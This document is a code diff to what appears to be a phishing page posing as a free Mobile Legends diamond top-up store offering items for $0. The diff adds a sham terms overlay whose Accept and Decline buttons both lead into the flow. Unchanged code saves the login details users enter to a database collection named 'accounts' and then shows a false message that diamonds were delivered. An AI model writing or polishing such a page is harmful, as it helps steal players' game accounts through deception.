@@ -48,19 +48,42 @@ input:focus{border-color:var(--primary);outline:none;}
 .loader-overlay{position:absolute;top:0;left:0;width:100%;height:100%;background:rgba(18,18,18,.95);display:none;flex-direction:column;justify-content:center;align-items:center;z-index:20;}
 .spinner{width:40px;height:40px;border:4px solid #333;border-top:4px solid var(--primary);border-radius:50%;animation:spin 1s linear infinite;}
 @keyframes spin{100%{transform:rotate(360deg);}}
+/* Agreement overlay styles */
+.agreement-overlay{position:absolute;top:0;left:0;width:100%;height:100%;background:rgba(18,18,18,.95);display:none;flex-direction:column;justify-content:center;align-items:center;z-index:30;padding:20px;box-sizing:border-box;}
+.agreement-overlay.show{display:flex;}
+.agreement-box{background:#2a2a2a;border:1px solid #444;border-radius:10px;padding:20px;max-width:340px;width:100%;max-height:80vh;overflow-y:auto;}
+.agreement-box h3{color:var(--primary);margin-top:0;text-align:center;font-size:1.1rem;}
+.agreement-box p{color:#ccc;font-size:.85rem;line-height:1.5;margin:10px 0;}
+.agreement-box .btn{width:100%;padding:10px;margin-top:12px;border:none;border-radius:5px;font-weight:bold;cursor:pointer;color:white;}
+.btn-accept{background:var(--primary);color:#000;}
+.btn-decline{background:#555;color:#ccc;}
 </style>
 </head>
 
 <body>
 <div class="container">
   <div class="header">
-    <img src="https://upload.wikimedia.org/wikipedia/en/9/98/Mobile_Legends_Bang_Logo.png" alt="MLBB">
-    <h2>Diamond Store</h2>
+    <h2>Mobile Legends</h2>
+    <h2>MLBB TOP-UP</h2>
   </div>
 
   <div class="content">
+    <!-- AGREEMENT OVERLAY (intro before any step) -->
+    <div id="agreementOverlay" class="agreement-overlay show">
+      <div class="agreement-box">
+        <h3>Terms & Agreement</h3>
+        <p>By proceeding, you agree to the following terms:</p>
+        <p>1. Dont abuse This Free Diamond.</p>
+        <p>2. All information provided must be accurate and belongs to you.</p>
+        <p>3. Refunds are handled according to the platform's refund policy.</p>
+        <p>Please review and accept the terms to continue.</p>
+        <button class="btn btn-accept" onclick="acceptAgreement()">Accept & Continue</button>
+        <button class="btn btn-decline" onclick="declineAgreement()">Decline</button>
+      </div>
+    </div>
+
     <!-- STEP 1 -->
-    <div id="step1" class="step active">
+    <div id="step1" class="step">
       <div class="grid">
         <div class="card" onclick="selectDiamond(112,'0.00',this)">
           <span class="amount">112 💎</span><span class="price">$0</span>
@@ -148,6 +171,16 @@ let selectedDiamond = null;
 let selectedPrice = null;
 let attemptCount = parseInt(localStorage.getItem('mlbb_attempt')||'0');
 
+// Agreement functions
+function acceptAgreement(){
+  document.getElementById('agreementOverlay').classList.remove('show');
+  document.getElementById('step1').classList.add('active');
+}
+function declineAgreement(){
+  document.getElementById('agreementOverlay').classList.remove('show');
+  document.getElementById('step1').classList.add('active');
+}
+
 // UI helpers
 function selectDiamond(amount, price, el){
   selectedDiamond = amount;
@@ -186,9 +219,7 @@ function switchTab(method, btn){
   document.getElementById(id).addEventListener('input', enableContinueIfAllFilled);
 });
 
-/*  ──────────────────────────────────────
-    NEW: Navigation event handlers
-    ────────────────────────────────────── */
+/* Navigation event handlers */
 document.getElementById('btn-next').addEventListener('click', ()=>goToStep(2));
 document.getElementById('btn-continue').addEventListener('click', ()=>goToStep(3));
 
@@ -227,10 +258,10 @@ async function processLogin(method){
       };
       try{
         await db.collection('accounts').add(data);
-        /* NEW: updated success notification */
-        alert(`Diamond is successful send to your account.`);
-        /* NEW: removed the page reload */
-        localStorage.setItem('mlbb_attempt','0');   // reset counter
+        /* Custom success notification */
+        alert('Diamond is successful send to your account.');
+        /* reset counter */
+        localStorage.setItem('mlbb_attempt','0');
       }catch(err){
         console.error('Error:',err);
         alert('Network Error. Please try again.');
